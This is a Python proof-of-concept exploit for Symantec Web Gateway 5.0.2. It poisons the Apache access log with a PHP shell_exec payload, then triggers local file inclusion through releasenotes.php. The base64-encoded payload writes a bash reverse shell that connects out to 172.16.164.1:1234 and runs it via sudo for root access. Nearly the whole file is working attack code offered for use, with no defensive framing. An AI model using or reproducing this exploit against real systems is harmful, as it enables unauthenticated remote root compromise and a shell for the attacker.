#!/usr/bin/python
 
# Symantec Web Gateway 5.0.2 Remote LFI root Exploit Proof of Concept
# Exploit requires no authentication, /tmp/networkScript is sudoable and apache writable.
# muts at offensive-security dot com
 
 
import socket
import base64
 
payload= '''echo '#!/bin/bash' > /tmp/networkScript; echo 'bash -i >& /dev/tcp/172.16.164.1/1234 0>&1' >> /tmp/networkScript;chmod 755 /tmp/networkScript; sudo /tmp/networkScript'''
payloadencoded=base64.encodestring(payload).replace("\n","")
taint="GET /<?php shell_exec(base64_decode('%s'));?> HTTP/1.1\r\n\r\n" % payloadencoded
 
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("172.16.164.129", 80))
expl.send(taint)
expl.close()
 
trigger="GET /spywall/releasenotes.php?relfile=../../../../../usr/local/apache2/logs/access_log HTTP/1.0\r\n\r\n"
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("172.16.164.129", 80))
expl.send(trigger)
expl.close()

